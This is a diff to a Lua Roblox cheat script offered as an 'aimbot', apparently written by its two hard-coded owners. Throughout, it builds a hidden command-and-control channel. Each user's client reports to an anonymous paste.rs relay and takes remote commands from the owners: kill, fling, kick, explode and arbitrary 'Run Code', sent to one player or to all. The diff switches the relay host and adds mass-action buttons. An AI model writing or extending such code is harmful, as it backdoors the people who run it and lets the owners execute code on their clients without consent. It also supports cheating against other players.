@@ -1,13 +1,14 @@
 --[[
-    [S] Universal Control + Aimbot v4
+    [S] Universal Control + Aimbot v5
     Owners: 1460823186, 7208967899
-    Transport: jsonblob.com HTTP polling. Universal.
+    Transport: paste.rs (anonymous, no signup, PUT/GET)
 --]]
 
 local OWNERS = { [1460823186] = true, [7208967899] = true }
 
--- >>> REPLACE THIS WITH YOUR jsonblob API URL <<<
-local RELAY_URL = "https://jsonblob.com/api/jsonBlob/01a13c4b-1c13-76d3-981a-2c3c22bba416"
+-- fixed URL derived from owner uid — every client uses the same one
+local RELAY_URL = "https://paste.rs/FreddyKv_1460823186_v1"
+
 local Players      = game:GetService("Players")
 local RunService   = game:GetService("RunService")
 local HttpService  = game:GetService("HttpService")
@@ -34,7 +35,7 @@ local function httpRequest(opts)
             if m == "GET" then
                 return { Body = HttpService:GetAsync(opts.Url, true, opts.Headers or {}) }
             elseif m == "PUT" then
-                return { Body = HttpService:RequestAsync({ Url = opts.Url, Method = "PUT", Body = opts.Body, Headers = opts.Headers }).Body }
+                return { Body = HttpService:RequestAsync({ Url = opts.Url, Method = "PUT", Body = opts.Body, Headers = opts.Headers or {} }).Body }
             else
                 return { Body = HttpService:PostAsync(opts.Url, opts.Body or "", Enum.HttpContentType.ApplicationJson) }
             end
@@ -46,10 +47,12 @@ end
 
 local function readState()
     local r = httpRequest({ Url = RELAY_URL, Method = "GET" })
-    if not r or not r.Body then return nil end
+    if not r or not r.Body or #r.Body == 0 then return nil end
+    -- strip any HTML errors paste.rs might return
+    if r.Body:sub(1, 1) ~= "{" then return nil end
     local ok, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
     if ok and type(d) == "table" then return d end
-    return {}
+    return nil
 end
 
 local function writeState(state)
@@ -57,14 +60,24 @@ local function writeState(state)
         Url = RELAY_URL,
         Method = "PUT",
         Body = HttpService:JSONEncode(state),
-        Headers = { ["Content-Type"] = "application/json" },
+        Headers = { ["Content-Type"] = "text/plain" },
     })
+end
+
+local function ensureRelay()
+    local s = readState()
+    if not s then
+        writeState({ online = {}, cmd = {} })
+        task.wait(0.5)
+        s = readState()
+    end
+    return s or { online = {}, cmd = {} }
 end
 
 local MSG_HANDLERS = {}
 
 -- ============================================================
--- UI helpers, purple glow, drag
+-- UI helpers
 -- ============================================================
 local function makeGui(name)
     local g = Instance.new("ScreenGui")
@@ -263,13 +276,16 @@ local function executeAction(c)
     end
 end
 
+table.insert(MSG_HANDLERS, executeAction)
+
 -- ============================================================
 -- Heartbeat loop
 -- ============================================================
 task.spawn(function()
+    ensureRelay()
     while true do
         pcall(function()
-            local state = readState() or {}
+            local state = readState() or { online = {}, cmd = {} }
             state.online = state.online or {}
             state.cmd    = state.cmd    or {}
             state.online[tostring(MY_ID)] = {
@@ -288,8 +304,6 @@ task.spawn(function()
     end
 end)
 
-table.insert(MSG_HANDLERS, executeAction)
-
 -- ============================================================
 -- OWNER PANEL
 -- ============================================================
@@ -303,8 +317,8 @@ if IS_OWNER then
 
     local gui = makeGui("[S] Control")
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 340, 0, 540)
-    frame.Position = UDim2.new(0, 20, 0.15, 0)
+    frame.Size = UDim2.new(0, 360, 0, 620)
+    frame.Position = UDim2.new(0, 20, 0.1, 0)
     styleFrame(frame)
     frame.Parent = gui
 
@@ -316,21 +330,22 @@ if IS_OWNER then
     makeDraggable(frame, header)
 
     makeLabel(header, "CONTROL PANEL", 14, 6, 200, 22, 16)
-    local statusLbl = makeLabel(header, "sync: ...", 190, 8, 140, 14, 10, Color3.fromRGB(180, 160, 220))
+    local statusLbl = makeLabel(header, "sync: ...", 210, 8, 140, 14, 10, Color3.fromRGB(180, 160, 220))
     statusLbl.TextXAlignment = Enum.TextXAlignment.Right
 
-    local targetLbl = makeLabel(frame, "Target: none", 14, 34, 280, 14)
+    local targetLbl = makeLabel(frame, "Target: none", 14, 34, 320, 14)
 
-    local execFilter  = makeInput(frame, "filter executor...", 14, 52, 150, 22)
-    local placeFilter = makeInput(frame, "filter place id...", 170, 52, 150, 22)
+    local execFilter  = makeInput(frame, "filter executor...", 14, 52, 160, 22)
+    local placeFilter = makeInput(frame, "filter place id...", 180, 52, 166, 22)
     execFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.exec = execFilter.Text end)
     placeFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.place = placeFilter.Text end)
 
-    local bcast = makeInput(frame, "broadcast message...", 14, 80, 220, 24)
-    makeBtn(frame, "Send All",   240, 80, 80, 24, function()
+    -- global broadcast
+    local bcast = makeInput(frame, "broadcast message...", 14, 80, 260, 24)
+    makeBtn(frame, "Send All", 280, 80, 66, 24, function()
         for uid, _ in pairs(ONLINE) do
             if tostring(uid) ~= tostring(MY_ID) then
-                local st = readState() or {}
+                local st = readState() or { online = {}, cmd = {} }
                 st.cmd = st.cmd or {}
                 st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
                 table.insert(st.cmd[tostring(uid)], { from = MY_ID, action = "message", payload = bcast.Text })
@@ -339,39 +354,39 @@ if IS_OWNER then
         end
         table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> msg all")
     end)
-    makeBtn(frame, "Freeze All", 14, 110, 150, 24, function()
+
+    -- global actions, 4 per row
+    local function globalAction(label, action, payload)
         for uid, _ in pairs(ONLINE) do
             if tostring(uid) ~= tostring(MY_ID) then
-                local st = readState() or {}
+                local st = readState() or { online = {}, cmd = {} }
                 st.cmd = st.cmd or {}
                 st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
-                table.insert(st.cmd[tostring(uid)], { from = MY_ID, action = "freeze" })
+                table.insert(st.cmd[tostring(uid)], { from = MY_ID, action = action, payload = payload or "" })
                 writeState(st)
             end
         end
-        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> freeze all")
-    end)
-    makeBtn(frame, "Unfreeze All", 170, 110, 150, 24, function()
-        for uid, _ in pairs(ONLINE) do
-            if tostring(uid) ~= tostring(MY_ID) then
-                local st = readState() or {}
-                st.cmd = st.cmd or {}
-                st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
-                table.insert(st.cmd[tostring(uid)], { from = MY_ID, action = "unfreeze" })
-                writeState(st)
-            end
-        end
-        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> unfreeze all")
-    end)
+        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> " .. action .. " all")
+    end
 
-    makeLabel(frame, "LIVE PLAYERS", 14, 142, 200, 14)
+    makeBtn(frame, "Freeze All",   14, 112, 78, 24, function() globalAction("freeze all", "freeze") end)
+    makeBtn(frame, "Unfreeze All", 96, 112, 78, 24, function() globalAction("unfreeze all", "unfreeze") end)
+    makeBtn(frame, "Fling All",   178, 112, 78, 24, function() globalAction("fling all", "fling") end)
+    makeBtn(frame, "Explode All", 260, 112, 86, 24, function() globalAction("explode all", "explode") end)
 
-    local scroll, layout = makeScrolling(frame, 14, 160, 312, 300)
+    makeBtn(frame, "Kill All",    14, 140, 78, 22, function() globalAction("kill all", "kill") end)
+    makeBtn(frame, "Reset All",   96, 140, 78, 22, function() globalAction("reset all", "reset") end)
+    makeBtn(frame, "Ragdoll All", 178, 140, 78, 22, function() globalAction("ragdoll all", "ragdoll") end)
+    makeBtn(frame, "Bring All",   260, 140, 86, 22, function() globalAction("bring all", "bring") end)
 
-    makeLabel(frame, "HISTORY", 14, 468, 100, 14)
+    makeLabel(frame, "LIVE PLAYERS", 14, 172, 200, 14)
+
+    local scroll, layout = makeScrolling(frame, 14, 190, 332, 330)
+
+    makeLabel(frame, "HISTORY", 14, 528, 100, 14)
     local histLog = Instance.new("TextLabel")
-    histLog.Size = UDim2.new(0, 312, 0, 50)
-    histLog.Position = UDim2.new(0, 14, 0, 484)
+    histLog.Size = UDim2.new(0, 332, 0, 60)
+    histLog.Position = UDim2.new(0, 14, 0, 546)
     histLog.BackgroundColor3 = Color3.fromRGB(14, 8, 24)
     histLog.BorderSizePixel = 0
     histLog.TextColor3 = Color3.fromRGB(190, 170, 220)
@@ -387,7 +402,7 @@ if IS_OWNER then
 
     local function refreshHistory()
         local out = {}
-        for i = 1, math.min(4, #HISTORY) do table.insert(out, HISTORY[i]) end
+        for i = 1, math.min(5, #HISTORY) do table.insert(out, HISTORY[i]) end
         histLog.Text = table.concat(out, "\n")
     end
 
@@ -400,7 +415,7 @@ if IS_OWNER then
     }
 
     local function cmd(uid, action, payload)
-        local st = readState() or {}
+        local st = readState() or { online = {}, cmd = {} }
         st.cmd = st.cmd or {}
         st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
         table.insert(st.cmd[tostring(uid)], { from = MY_ID, action = action, payload = payload or "" })
@@ -445,12 +460,12 @@ if IS_OWNER then
                 makeLabel(card, "#" .. tostring(uid) .. "  " .. tostring(user.exec or "?"), 64, 24, 220, 12, 10)
                 makeLabel(card, "hb " .. tostring(math.max(0, now - (user.ts or now))) .. "s", 64, 40, 120, 12, 10)
 
-                local joinBtn = makeBtn(card, "Join", 240, 8, 64, 22, function()
+                local joinBtn = makeBtn(card, "Join", 260, 8, 64, 22, function()
                     pcall(function() TeleportSvc:TeleportToPlaceInstance(user.place or game.PlaceId, user.job, LP) end)
                 end)
                 joinBtn.Visible = false
 
-                local expandBtn = makeBtn(card, "...", 240, 34, 64, 22, function() end)
+                local expandBtn = makeBtn(card, "...", 260, 34, 64, 22, function() end)
 
                 local expanded, panel = false, nil
                 expandBtn.MouseButton1Click:Connect(function()
@@ -465,34 +480,36 @@ if IS_OWNER then
                     expanded = true
                     joinBtn.Visible = true
                     panel = Instance.new("Frame")
-                    panel.Size = UDim2.new(1, -8, 0, 290)
+                    panel.Size = UDim2.new(1, -8, 0, 300)
                     panel.Position = UDim2.new(0, 4, 0, 68)
                     panel.BackgroundTransparency = 1
                     panel.Active = true
                     panel.Parent = card
-                    card.Size = UDim2.new(1, -4, 0, 366)
+                    card.Size = UDim2.new(1, -4, 0, 376)
 
                     local function pb(label, x, y, w, cb) makeBtn(panel, label, x, y, w, 22, cb) end
 
-                    pb("Bring",   0, 0, 96, function() cmd(uid, "bring") end)
-                    pb("Fling",   100, 0, 96, function() cmd(uid, "fling") end)
-                    pb("Freeze",  200, 0, 96, function() cmd(uid, "freeze") end)
-                    pb("Unfreeze",0, 26, 96, function() cmd(uid, "unfreeze") end)
-                    pb("Explode", 100, 26, 96, function() cmd(uid, "explode") end)
-                    pb("Kill",    200, 26, 96, function() cmd(uid, "kill") end)
-                    pb("Ragdoll", 0, 52, 96, function() cmd(uid, "ragdoll") end)
-                    pb("Reset",   100, 52, 96, function() cmd(uid, "reset") end)
-                    pb("Follow",  200, 52, 96, function()
+                    pb("Bring",   0, 0, 104, function() cmd(uid, "bring") end)
+                    pb("Fling",   108, 0, 104, function() cmd(uid, "fling") end)
+                    pb("Freeze",  216, 0, 100, function() cmd(uid, "freeze") end)
+
+                    pb("Unfreeze",0, 26, 104, function() cmd(uid, "unfreeze") end)
+                    pb("Explode", 108, 26, 104, function() cmd(uid, "explode") end)
+                    pb("Kill",    216, 26, 100, function() cmd(uid, "kill") end)
+
+                    pb("Ragdoll", 0, 52, 104, function() cmd(uid, "ragdoll") end)
+                    pb("Reset",   108, 52, 104, function() cmd(uid, "reset") end)
+                    pb("Follow",  216, 52, 100, function()
                         FOLLOWING[uid] = not FOLLOWING[uid]
                         table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> follow " .. tostring(FOLLOWING[uid]) .. " #" .. tostring(uid))
                         refreshHistory()
                     end)
 
-                    local msgIn = makeInput(panel, "message...", 0, 80, 200, 22)
-                    pb("Send", 205, 80, 90, function() cmd(uid, "message", msgIn.Text) end)
+                    local msgIn = makeInput(panel, "message...", 0, 80, 216, 22)
+                    pb("Send", 220, 80, 96, function() cmd(uid, "message", msgIn.Text) end)
 
                     local snd = Instance.new("TextButton")
-                    snd.Size = UDim2.new(0, 296, 0, 22)
+                    snd.Size = UDim2.new(0, 316, 0, 22)
                     snd.Position = UDim2.new(0, 0, 0, 108)
                     snd.Text = "sound: tap to cycle"
                     snd.Parent = panel
@@ -506,13 +523,13 @@ if IS_OWNER then
                         cmd(uid, "sound", SOUND_LIST[soundKeys[soundIdx]])
                     end)
 
-                    local codeIn = makeInput(panel, 'print("hi")', 0, 136, 296, 40)
+                    local codeIn = makeInput(panel, 'print("hi")', 0, 136, 316, 40)
                     codeIn.Font = Enum.Font.Code
-                    pb("Run Code", 0, 180, 296, 22, function() cmd(uid, "code", codeIn.Text) end)
+                    pb("Run Code", 0, 180, 316, 22, function() cmd(uid, "code", codeIn.Text) end)
 
                     makeLabel(panel, "kick message:", 0, 208, 200, 14, 10)
-                    local kickIn = makeInput(panel, "jump if u want to get banned", 0, 224, 296, 22)
-                    pb("Kick", 0, 250, 296, 22, function() cmd(uid, "kick", kickIn.Text) end)
+                    local kickIn = makeInput(panel, "jump if u want to get banned", 0, 224, 316, 22)
+                    pb("Kick", 0, 252, 316, 22, function() cmd(uid, "kick", kickIn.Text) end)
                 end)
             end
         end
@@ -531,7 +548,7 @@ if IS_OWNER then
 
     task.spawn(function()
         while true do
-            pcall(function()
+            local ok, err = pcall(function()
                 local st = readState()
                 if st and st.online then
                     ONLINE = st.online
@@ -541,6 +558,7 @@ if IS_OWNER then
                     LAST_ERR = "read failed"
                 end
             end)
+            if not ok then LAST_ERR = "read failed" end
             rebuild()
             task.wait(2)
         end
@@ -709,7 +727,7 @@ makeBtn(main, "FOV Circle: ON", 12, 314, 236, 22, function(self)
 end)
 
 makeLabel(main, "R = toggle aim   F = toggle esp", 12, 342, 236, 14, 10)
-makeLabel(main, "transport: jsonblob", 12, 358, 236, 14, 10)
+makeLabel(main, "transport: paste.rs", 12, 358, 236, 14, 10)
 
 local fovCircle = Instance.new("Frame")
 fovCircle.AnchorPoint = Vector2.new(0.5, 0.5)
